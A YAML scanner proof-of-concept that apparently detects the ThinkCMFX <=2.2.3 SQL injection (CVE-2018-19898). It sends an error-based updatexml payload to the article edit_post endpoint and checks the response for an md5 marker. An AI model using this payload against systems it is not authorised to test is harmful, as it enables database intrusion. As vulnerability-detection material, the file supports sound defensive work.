name: poc-yaml-thinkcmf-cve-2018-19898-sqli
manual: true
transport: http
set:
  rand1: randomInt(800000000, 1000000000)
rules:
  r0:
    request:
      method: POST
      path: /?g=portal&m=article&a=edit_post
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: post[id][0]=bind&post[id][1]=0 and updatexml(1, concat(0x7e,(SELECT md5({{rand1}})),0x7e),1)--+-
    expression: response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
expression: r0()
detail:
  author: min(minrui.zhang@chaitin.com)
  links:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-19898
    - https://github.com/thinkcmf/cmfx/issues/26
  ThinkCMF: ThinkCMFX <=2.2.3
  info:
    - 需要普通用户权限，默认可注册
    - mysql5 之下有未知bug。poc测试环境为mysql8
  vulnerability:
    id: CT-76908
    level: high
    taskid: KBTask-011
